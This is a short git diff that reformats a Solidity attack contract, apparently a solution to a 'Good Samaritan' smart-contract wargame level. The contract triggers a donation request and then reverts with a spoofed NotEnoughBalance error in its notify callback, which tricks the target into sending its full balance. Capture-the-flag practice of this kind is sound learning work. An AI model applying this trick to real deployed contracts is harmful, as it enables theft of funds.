@@ -6,17 +6,15 @@ interface IGoodSamaritan {
 }
 
 contract HackGoodSamaritan {
-
     error NotEnoughBalance();
 
     function attack(IGoodSamaritan _goodSam) external {
         _goodSam.requestDonation();
     }
 
-    function notify(uint256 amount) pure external {
-      if(amount <= 10) {
-        revert NotEnoughBalance();
-      }
+    function notify(uint256 amount) external pure {
+        if (amount <= 10) {
+            revert NotEnoughBalance();
+        }
     }
 }
-
